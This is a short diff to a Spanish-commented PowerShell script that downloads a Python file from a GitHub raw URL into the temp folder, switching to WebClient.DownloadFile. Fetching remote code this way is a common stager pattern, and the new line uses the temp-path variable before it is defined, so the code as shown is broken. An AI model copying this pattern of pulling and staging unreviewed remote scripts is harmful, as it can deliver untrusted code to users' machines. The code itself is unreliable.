@@ -1,8 +1,9 @@
 # Definir la URL del script de Python
-$PythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'
+$PythonScriptURL = 'https://raw.githubusercontent.com/astronomyc/filesRecents/main/main.py'
 
 # Descargar el script de Python desde la URL
-$PythonScriptContent = Invoke-WebRequest -Uri $PythonScriptURL -UseBasicParsing | Select-Object -ExpandProperty Content
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($PythonScriptURL, $TempPythonScriptPath)
 
 # Guardar el script de Python en un archivo temporal
 $TempPythonScriptPath = "$env:TEMP\main.py"
